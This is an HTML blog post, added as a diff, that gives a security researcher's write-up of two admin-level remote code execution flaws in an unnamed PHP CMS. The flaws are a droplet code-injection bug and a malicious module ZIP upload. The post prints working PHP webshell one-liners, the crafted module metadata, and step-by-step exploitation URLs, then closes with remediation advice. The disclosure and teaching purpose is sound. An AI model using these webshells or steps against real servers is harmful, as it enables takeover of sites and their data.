@@ -1,0 +1,273 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Two RCE Vulnerabilities I Found on My Birthday Evening — be444's blog</title>
+  <link rel="stylesheet" href="../style.css" />
+  <style>
+    .post-content code {
+      background: #f4f4f4;
+      padding: 2px 6px;
+      border-radius: 3px;
+      font-family: 'Courier New', monospace;
+      font-size: 0.9em;
+    }
+    .post-content pre {
+      background: #2d2d2d;
+      color: #f8f8f2;
+      padding: 15px;
+      border-radius: 5px;
+      overflow-x: auto;
+      margin: 15px 0;
+      font-family: 'Courier New', monospace;
+      font-size: 0.85em;
+      line-height: 1.4;
+    }
+    .post-content pre code {
+      background: none;
+      padding: 0;
+      color: inherit;
+    }
+    .post-content h2 {
+      margin-top: 30px;
+      margin-bottom: 15px;
+      border-bottom: 2px solid #ddd;
+      padding-bottom: 10px;
+    }
+    .post-content h3 {
+      margin-top: 25px;
+      margin-bottom: 12px;
+      color: #333;
+    }
+    .post-content p {
+      line-height: 1.6;
+      margin: 12px 0;
+    }
+    .post-content blockquote {
+      border-left: 4px solid #007bff;
+      padding-left: 15px;
+      margin: 15px 0;
+      color: #666;
+      font-style: italic;
+    }
+    .post-meta {
+      color: #999;
+      font-size: 0.9em;
+      margin-bottom: 30px;
+    }
+  </style>
+</head>
+<body>
+<div id="sidebar">
+  <a href="../index.html" class="avatar">b4</a>
+  <a href="../index.html" class="site-title">be444's blog</a>
+  <span class="site-subtitle">security research &amp; writeups</span>
+  <nav class="sidebar-nav">
+    <ul>
+      <li><a href="../index.html">⌂ Home</a></li>
+      <li><a href="../posts.html">✦ Posts</a></li>
+      <li class="has-submenu" id="machines-menu">
+        <a onclick="toggleMachines(event)">⚙ Machines <span class="arrow">▶</span></a>
+        <ul class="submenu" id="machines-sub">
+          <li><a href="../machines/linux.html">🐧 Linux</a></li>
+          <li><a href="../machines/windows.html">🪟 Windows</a></li>
+        </ul>
+      </li>
+      <li><a href="../tags.html"># Tags</a></li>
+      <li><a href="../about.html">~ About</a></li>
+    </ul>
+  </nav>
+  <div class="sidebar-links">
+    <a href="https://github.com/Benjamin-Asare-Agyapong" target="_blank">GitHub</a>
+  </div>
+</div>
+<div id="main">
+  <article class="post">
+    <div class="page-header">
+      <h1>Two RCE Vulnerabilities I Found on My Birthday Evening</h1>
+      <p class="post-meta">June 2026</p>
+    </div>
+    <div class="post-content">
+
+<h2>Introduction</h2>
+
+<p>It was my birthday evening. Most people would be out celebrating — I decided to go bug hunting instead. No regrets whatsoever.</p>
+
+<p>What started as a casual poke at a popular open-source PHP-based Content Management System quickly turned into something far more rewarding. By the end of the night, I had uncovered <strong>two distinct Remote Code Execution vulnerabilities</strong> — both requiring only admin-level access to trigger, and both leaving the server wide open to unauthenticated exploitation afterwards.</p>
+
+<p>Here's what I found:</p>
+
+<ol>
+<li><strong>Code Injection via the Oneliner Droplet</strong> – An admin can inject arbitrary PHP code into the built-in Oneliner droplet editor, which writes it directly to a publicly accessible PHP file on disk with no sanitization.</li>
+<li><strong>RCE via Malicious Archive Upload</strong> – An admin can upload a crafted ZIP archive disguised as a plugin/module, which gets extracted into the webroot with zero content validation.</li>
+</ol>
+
+<p>Let's get into it.</p>
+
+<h2>Vulnerability 1: Code Injection via the Oneliner Droplet</h2>
+
+<h3>Background</h3>
+
+<p>The CMS ships with a <strong>Droplets</strong> feature — a system for creating reusable PHP code snippets that can be embedded anywhere on the site using simple tags (e.g. <code>[[OneLiner]]</code>). One of the built-in droplets is called <strong>Oneliner</strong>, designed to generate random one-liner text on a page.</p>
+
+<p>Administrators can open and edit any droplet's code directly from the admin panel through a web-based PHP editor. On the surface, this is a legitimate power-user feature. The problem is in what happens when you hit <strong>Save</strong>.</p>
+
+<h3>Root Cause</h3>
+
+<p>The save handler takes whatever code is submitted and writes it <strong>verbatim</strong> to a standalone PHP file on disk — no sanitization, no content filtering, no allowlist. The Oneliner droplet specifically gets saved to a fixed, predictable path inside the modules directory.</p>
+
+<p>Here's the kicker: <strong>that file is publicly accessible with no authentication required</strong>.</p>
+
+<p>The full attack chain:</p>
+
+<ol>
+<li>Admin submits a PHP payload via a <code>save_droplet</code> POST request to the save handler</li>
+<li>The application writes it directly to the Oneliner droplet's <code>.php</code> file on disk</li>
+<li>That file is publicly reachable at a predictable URL — no auth required to visit it</li>
+</ol>
+
+<h3>Proof of Concept</h3>
+
+<p><strong>Step 1:</strong> Log into the admin panel.</p>
+
+<p><strong>Step 2:</strong> Navigate to the <strong>Admin Tools</strong> section.</p>
+
+<p><strong>Step 3:</strong> Open the <strong>Droplets</strong> management tool.</p>
+
+<p><strong>Step 4:</strong> Select <strong>Oneliner</strong> from the list of available droplets.</p>
+
+<p><strong>Step 5:</strong> Inject your PHP webshell into the <strong>Code</strong> field:</p>
+
+<pre><code>&lt;?php if(isset($_REQUEST['cmd'])){system($_REQUEST['cmd']);}?&gt;</code></pre>
+
+<p><strong>Step 6:</strong> Hit <strong>Save</strong>.</p>
+
+<p><strong>Step 7:</strong> Navigate directly to the saved droplet file in your browser:</p>
+
+<pre><code>http://&lt;target&gt;/modules/droplets/example/Oneliner.php?cmd=id</code></pre>
+
+<p>You'll be greeted with something like:</p>
+
+<pre><code>uid=33(www-data) gid=33(www-data) groups=33(www-data)</code></pre>
+
+<p>Full remote code execution. No further authentication needed.</p>
+
+<h3>Why This Works</h3>
+
+<p>The Oneliner droplet editor trusts that admins will only write safe, well-behaved PHP. No attempt is made to validate or restrict what gets saved. Since the resulting file lives at a publicly accessible path with no access controls sitting in front of it, once the payload is written, anyone on the internet can trigger it directly.</p>
+
+<h2>Vulnerability 2: RCE via Malicious Archive Upload</h2>
+
+<h3>Background</h3>
+
+<p>The CMS supports extending its functionality through installable modules/plugins. Administrators can upload a ZIP archive from the admin panel, and the system extracts it directly into the webroot's modules directory.</p>
+
+<p>The only check performed is verifying the presence of a metadata file inside the ZIP with a handful of required variable declarations. That's where the validation ends.</p>
+
+<h3>Root Cause</h3>
+
+<p>Since the application performs <strong>no content inspection</strong> on the files inside the archive, any PHP file bundled alongside the metadata gets extracted into a web-accessible directory — and becomes immediately reachable by unauthenticated users via a direct HTTP request.</p>
+
+<p>The internal logic looks roughly like this:</p>
+
+<pre><code>$sAddonDirectory = 'shell'; // read from $module_directory in the metadata file
+$sAddonAbsDir    = $sAppPath . 'modules/' . $sAddonDirectory;
+// resolves to: /var/www/html/modules/shell
+
+make_dir($sAddonAbsDir); // creates the directory
+
+$oArchive-&gt;extract(PCLZIP_OPT_PATH, $sAddonAbsDir);
+// extracts everything — including any PHP webshell — into the directory</code></pre>
+
+<p>Everything in the ZIP lands directly in the webroot. No further checks. The shell is live the moment installation completes.</p>
+
+<h3>Building the Payload</h3>
+
+<p>You need two files:</p>
+
+<p><strong><code>shell.php</code></strong> — the webshell:</p>
+
+<pre><code>&lt;?php if(isset($_GET['cmd'])){system($_GET['cmd']);}?&gt;</code></pre>
+
+<p><strong><code>info.php</code></strong> — the required metadata file:</p>
+
+<pre><code>&lt;?php
+$module_directory   = 'shell';
+$module_name        = 'Shell';
+$module_type        = 'addon';
+$module_function    = 'page';
+$module_version     = '1.0.0';
+$module_platform    = '2.13.0';
+$module_author      = 'admin';
+$module_license     = 'GNU General Public License';
+$module_description = 'Shell module';</code></pre>
+
+<p>Bundle them together:</p>
+
+<pre><code>zip module_install.zip shell.php info.php</code></pre>
+
+<blockquote>
+<p><strong>Note:</strong> Use a directory name that doesn't conflict with any existing module — the system will reject uploads that clash with existing names.</p>
+</blockquote>
+
+<h3>Proof of Concept</h3>
+
+<p><strong>Step 1:</strong> Log into the admin panel.</p>
+
+<p><strong>Step 2:</strong> Navigate to the <strong>Add-ons</strong> or <strong>Extensions</strong> section.</p>
+
+<p><strong>Step 3:</strong> Go to <strong>Modules</strong> and find the module installation form.</p>
+
+<p><strong>Step 4:</strong> Upload your crafted <code>module_install.zip</code>.</p>
+
+<p><strong>Step 5:</strong> Click <strong>Install</strong>.</p>
+
+<p><strong>Step 6:</strong> Visit the extracted webshell directly:</p>
+
+<pre><code>http://&lt;target&gt;/modules/shell/shell.php?cmd=id</code></pre>
+
+<p>Output:</p>
+
+<pre><code>uid=33(www-data) gid=33(www-data) groups=33(www-data)</code></pre>
+
+<h2>Impact</h2>
+
+<p>Both vulnerabilities sit behind admin authentication, but that's a thinner barrier than it sounds. In real-world scenarios, admin access can be reached through:</p>
+
+<ul>
+<li>Default or weak credentials left unchanged</li>
+<li>Credential stuffing or phishing attacks</li>
+<li>A separate privilege escalation bug chained with either of these</li>
+</ul>
+
+<p>Once an attacker clears that hurdle, they have a direct path to <strong>full server compromise</strong> — and the resulting shell requires no authentication at all to operate.</p>
+
+<h2>Remediation</h2>
+
+<p><strong>For the Oneliner Droplet:</strong> The application should never write raw user-supplied PHP code to a web-accessible file. The droplet save handler needs content filtering at minimum, and the resulting file should never be directly reachable without an authentication gate in front of it.</p>
+
+<p><strong>For the module upload:</strong> Archive contents must be inspected before extraction. Only expected, explicitly allowed file types should be extracted, and PHP files should be categorically blocked. Ideally, uploaded module files should live outside the webroot entirely.</p>
+
+<h2>Conclusion</h2>
+
+<p>Two vulnerabilities, one birthday evening. Both rooted in the same underlying mistake: <strong>trusting that admin input is safe, and placing the output somewhere the whole internet can reach</strong>.</p>
+
+<p>Privilege doesn't equal safety. Your file handling pipeline needs hardening regardless of who's on the other end of the request.</p>
+
+<p>Stay curious. 🎂</p>
+
+    </div>
+  </article>
+</div>
+<script>
+function toggleMachines(e) {
+  e.preventDefault();
+  const menu = document.getElementById('machines-menu');
+  const sub = document.getElementById('machines-sub');
+  menu.classList.toggle('open');
+  sub.classList.toggle('open');
+}
+</script>
+</body>
+</html>
